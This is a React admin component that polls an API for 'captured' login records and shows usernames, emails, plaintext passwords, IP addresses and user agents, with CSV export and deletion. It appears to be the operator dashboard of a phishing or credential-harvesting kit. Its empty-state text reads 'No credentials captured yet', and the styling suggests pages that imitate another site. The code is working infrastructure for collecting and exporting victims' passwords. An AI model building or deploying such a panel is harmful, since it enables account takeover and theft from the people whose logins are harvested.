"use client";

import { useEffect, useState, useCallback } from "react";
import type { LoginCredential } from "@/lib/supabase";

function downloadCredentialsCsv(credentials: LoginCredential[]) {
  const headers = [
    "Date",
    "Page",
    "Username",
    "Email",
    "Password",
    "IP Address",
    "User Agent",
  ];

  const rows = credentials.map((cred) => [
    new Date(cred.created_at).toISOString(),
    cred.page || "login",
    cred.username || "",
    cred.email || "",
    cred.password,
    cred.ip_address || "",
    cred.user_agent || "",
  ]);

  const csv = [headers, ...rows]
    .map((row) =>
      row.map((cell) => `"${String(cell).replace(/"/g, '""')}"`).join(",")
    )
    .join("\n");

  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const link = document.createElement("a");
  link.href = url;
  link.download = `credentials-${new Date().toISOString().slice(0, 10)}.csv`;
  link.click();
  URL.revokeObjectURL(url);
}

export default function CredentialsTable() {
  const [credentials, setCredentials] = useState<LoginCredential[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState("");
  const [deletingId, setDeletingId] = useState<string | null>(null);

  const fetchCredentials = useCallback(async () => {
    try {
      const res = await fetch("/api/admin/credentials");
      if (!res.ok) throw new Error("Failed to fetch");
      const data = await res.json();
      setCredentials(data.credentials || []);
      setError("");
    } catch {
      setError("Failed to load credentials");
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchCredentials();
    const interval = setInterval(fetchCredentials, 10000);
    return () => clearInterval(interval);
  }, [fetchCredentials]);

  async function handleDelete(id: string) {
    if (!confirm("Delete this credential record?")) return;

    setDeletingId(id);
    try {
      const res = await fetch(`/api/admin/credentials/${id}`, { method: "DELETE" });
      if (!res.ok) throw new Error("Failed to delete");
      setCredentials((prev) => prev.filter((cred) => cred.id !== id));
    } catch {
      setError("Failed to delete credential");
    } finally {
      setDeletingId(null);
    }
  }

  if (loading) {
    return <p className="text-[13px] text-ft-muted">Loading...</p>;
  }

  if (error && credentials.length === 0) {
    return <p className="text-[13px] text-red-600">{error}</p>;
  }

  return (
    <div>
      <div className="flex items-center justify-end gap-3 mb-4">
        <button
          onClick={() => downloadCredentialsCsv(credentials)}
          disabled={credentials.length === 0}
          className="ft-btn text-[12px] py-2 px-4 disabled:opacity-50 disabled:cursor-not-allowed"
        >
          Download CSV
        </button>
      </div>

      {error && (
        <div className="bg-red-50 border border-red-200 text-red-700 text-[13px] p-3 mb-4">
          {error}
        </div>
      )}

      {credentials.length === 0 ? (
        <div className="bg-white border border-ft-border p-8 text-center">
          <p className="text-[14px] text-ft-muted">No credentials captured yet.</p>
        </div>
      ) : (
        <div className="bg-white border border-ft-border overflow-x-auto">
          <table className="w-full text-[13px]">
            <thead>
              <tr className="bg-ft-light-gray border-b border-ft-border">
                <th className="text-left p-3 font-bold">Date</th>
                <th className="text-left p-3 font-bold">Page</th>
                <th className="text-left p-3 font-bold">Username</th>
                <th className="text-left p-3 font-bold">Email</th>
                <th className="text-left p-3 font-bold">Password</th>
                <th className="text-left p-3 font-bold">IP Address</th>
                <th className="text-left p-3 font-bold">User Agent</th>
                <th className="text-left p-3 font-bold w-[80px]">Actions</th>
              </tr>
            </thead>
            <tbody>
              {credentials.map((cred) => (
                <tr
                  key={cred.id}
                  className="border-b border-ft-border hover:bg-ft-light-gray/50"
                >
                  <td className="p-3 whitespace-nowrap text-ft-muted">
                    {new Date(cred.created_at).toLocaleString()}
                  </td>
                  <td className="p-3">
                    <span className="ft-category">{cred.page || "login"}</span>
                  </td>
                  <td className="p-3 font-medium">{cred.username || "—"}</td>
                  <td className="p-3">{cred.email || "—"}</td>
                  <td className="p-3 font-mono text-[12px] bg-yellow-50">
                    {cred.password}
                  </td>
                  <td className="p-3 text-ft-muted">{cred.ip_address || "—"}</td>
                  <td
                    className="p-3 text-ft-muted max-w-[200px] truncate"
                    title={cred.user_agent || ""}
                  >
                    {cred.user_agent || "—"}
                  </td>
                  <td className="p-3">
                    <button
                      onClick={() => handleDelete(cred.id)}
                      disabled={deletingId === cred.id}
                      className="text-[12px] text-red-600 hover:text-red-800 hover:underline disabled:opacity-50"
                    >
                      {deletingId === cred.id ? "..." : "Delete"}
                    </button>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
          <div className="p-3 border-t border-ft-border flex items-center justify-between">
            <span className="text-[12px] text-ft-muted">
              {credentials.length} record{credentials.length !== 1 ? "s" : ""}
            </span>
            <button
              onClick={fetchCredentials}
              className="text-[12px] text-ft-red hover:underline"
            >
              Refresh
            </button>
          </div>
        </div>
      )}
    </div>
  );
}
